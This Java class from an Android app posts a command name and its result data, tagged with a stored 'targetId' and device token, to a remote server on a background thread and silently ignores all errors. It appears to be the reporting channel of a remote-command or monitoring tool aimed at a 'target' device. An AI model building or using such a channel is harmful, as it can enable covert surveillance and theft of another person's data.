package com.nullx.pp;

import android.content.Context;
import java.nio.charset.StandardCharsets;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStream;
import org.json.JSONObject;

final class GuardianCommandReporter {
    private GuardianCommandReporter() {}
    static void post(Context c, String cmd, JSONObject data) {
        new Thread(() -> {
            try {
                String id = c.getSharedPreferences("GuardianPrefs", Context.MODE_PRIVATE).getString("targetId", "");
                String token = c.getSharedPreferences("GuardianPrefs", Context.MODE_PRIVATE).getString("chatToken", "");
                if (id.isEmpty() || token.isEmpty() || DeviceService.getBaseUrl().isEmpty()) return;
                JSONObject body = new JSONObject();
                body.put("cmd", cmd);
                body.put("data", data == null ? new JSONObject() : data);
                body.put("deviceToken", token);
                HttpURLConnection h = (HttpURLConnection)new URL(DeviceService.url("/api/post-response/" + java.net.URLEncoder.encode(id, "UTF-8"))).openConnection();
                h.setRequestMethod("POST"); h.setConnectTimeout(8000); h.setReadTimeout(8000); h.setDoOutput(true);
                h.setRequestProperty("Content-Type", "application/json");
                try (OutputStream os = h.getOutputStream()) { os.write(body.toString().getBytes(StandardCharsets.UTF_8)); }
                h.getResponseCode(); h.disconnect();
            } catch (Exception ignored) {}
        }, "GuardianReporter").start();
    }
}
